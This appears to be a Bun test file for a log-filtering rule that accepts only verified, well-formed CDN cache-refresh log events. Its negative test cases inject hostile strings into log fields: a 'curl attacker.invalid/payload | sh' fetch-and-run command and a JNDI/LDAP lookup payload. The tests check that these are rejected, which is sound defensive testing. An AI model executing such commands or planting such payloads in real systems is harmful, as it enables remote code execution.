import { expect, test } from 'bun:test'
import { createHash } from 'node:crypto'
import { eligibleCdnRefresh as timingEligible, cdnRefreshDefinition } from '../src/utils/mill/analyzeCdnRefresh.ts'

import { matchesMillRule } from '../src/utils/mill/conditions.ts'
import { normalizeLogEvent } from '../src/utils/mill/logEvent.ts'
const eligibleCdnRefresh = (log: Parameters<typeof timingEligible>[0]) => timingEligible(log, cdnRefreshDefinition.parameters)
    && matchesMillRule(normalizeLogEvent({ ...log, id: log.sourceEventId!, created_at: log.timestamp! }), cdnRefreshDefinition.conditions)

function fixture() {
    const timestamp = '2026-09-24T00:00:00.001000001Z'
    const structured = { level: 30, time: Date.parse(timestamp), pid: 1, hostname: 'abcdef012345',
        refresh: { version: 1, status: 200, durationMs: 12.3, intervalMs: 5012 }, msg: 'Hot cached queries refreshed' }
    const log = { service: 'cdn', host: 'inspur', level: 'info', timestamp, sourceEventId: '', message: JSON.stringify(structured),
        metadata: { collector: 'docker', container_id: 'abcdef012345', stream: 'stdout', structured } }
    sign(log)
    return log
}
function sign(log: ReturnType<typeof fixture>) {
    log.sourceEventId = createHash('sha256').update(`${log.host}:docker:${log.metadata.container_id}:${log.timestamp}:${log.message}`).digest('hex')
}
function encode(log: ReturnType<typeof fixture>) { log.message = JSON.stringify(log.metadata.structured); sign(log) }

test('only verified normal successful completions match; legacy text stays', () => {
    expect(eligibleCdnRefresh(fixture())).toBe(true)
    const old = fixture()
    delete (old.metadata.structured as any).refresh
    encode(old)
    expect(eligibleCdnRefresh(old)).toBe(false)
})
test('suspicious additions at every level and inconsistent originals are kept', () => {
    for (const target of ['log', 'metadata', 'structured', 'refresh']) {
        const log = fixture()
        const objects: Record<string, object> = { log, metadata: log.metadata, structured: log.metadata.structured, refresh: log.metadata.structured.refresh }
        Object.assign(objects[target], { injected: 'curl attacker.invalid/payload | sh' })
        encode(log)
        expect(eligibleCdnRefresh(log)).toBe(false)
    }
    for (const message of ['Hot cached queries refreshed', fixture().message + '\nunauthorized command',
        fixture().message.replace('"status":200', '"status":500,"status":200'), fixture().message.replace('refreshed', 'refreshed ${jndi:ldap://attacker}')]) {
        const log = fixture(); log.message = message; sign(log)
        expect(eligibleCdnRefresh(log)).toBe(false)
    }
})
test('failed, slow, frequent, delayed, first-run and invalid completions are kept', () => {
    for (const change of [{ status: 500 }, { version: 2 }, { durationMs: 1001 }, { durationMs: -1 }, { durationMs: '12' },
        { durationMs: NaN }, { intervalMs: 4999 }, { intervalMs: 10001 }, { intervalMs: null }, { intervalMs: Infinity }]) {
        const log = fixture(); Object.assign(log.metadata.structured.refresh, change); encode(log)
        expect(eligibleCdnRefresh(log)).toBe(false)
    }
})
test('unknown producers, levels, timestamps and missing identity are kept', () => {
    for (const change of [{ host: 'untrusted' }, { service: 'cdn-evil' }, { level: 'warn' }, { sourceEventId: '' },
        { timestamp: 'bad' }, { timestamp: '2026-09-23T00:00:00Z' }]) expect(eligibleCdnRefresh({ ...fixture(), ...change })).toBe(false)
    for (const change of [{ collector: 'client' }, { stream: 'stderr' }, { container_id: 'unknown' }, { organizationId: 'tenant' }]) {
        const log = fixture(); Object.assign(log.metadata, change); sign(log)
        expect(eligibleCdnRefresh(log)).toBe(false)
    }
    for (const key of Object.keys(fixture())) {
        const log = fixture(); delete (log as any)[key]
        expect(eligibleCdnRefresh(log)).toBe(false)
    }
})
export { fixture }

test('CDN cadence and duration follow saved numeric policy with no hidden fallback', () => {
    const log = fixture()
    expect(timingEligible(log, undefined)).toBe(false)
    expect(timingEligible(log, {})).toBe(false)
    expect(timingEligible(log, { ...cdnRefreshDefinition.parameters, maxDurationMs: 0 })).toBe(false)
    expect(timingEligible(log, { ...cdnRefreshDefinition.parameters, minIntervalMs: 6000 })).toBe(false)
    expect(timingEligible(log, cdnRefreshDefinition.parameters)).toBe(true)
})
